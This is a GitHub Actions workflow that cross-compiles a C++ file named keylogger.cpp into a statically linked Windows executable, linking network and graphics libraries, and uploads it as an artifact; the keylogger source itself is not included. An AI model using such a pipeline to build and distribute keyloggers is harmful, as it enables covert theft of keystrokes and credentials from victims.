name: Build Windows EXE

on:
  push:
    branches: [ main ]
  workflow_dispatch:

env:
  # This line tells GitHub Actions to use Node.js 24, fixing the deprecation warning.
  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup MinGW-w64
        # This action installs the compiler and sets up the environment correctly.
        uses: egor-tensin/setup-mingw@v2
        with:
          platform: x64

      - name: Verify Compiler
        # A quick check to make sure the compiler is ready.
        run: x86_64-w64-mingw32-g++ --version

      - name: Compile keylogger
        run: |
          # The compiler and its libraries are now available system-wide.
          x86_64-w64-mingw32-g++ -o keylogger.exe keylogger.cpp -lwininet -lgdi32 -static

      - name: Upload EXE
        uses: actions/upload-artifact@v4
        with:
          name: keylogger-exe
          path: keylogger.exe
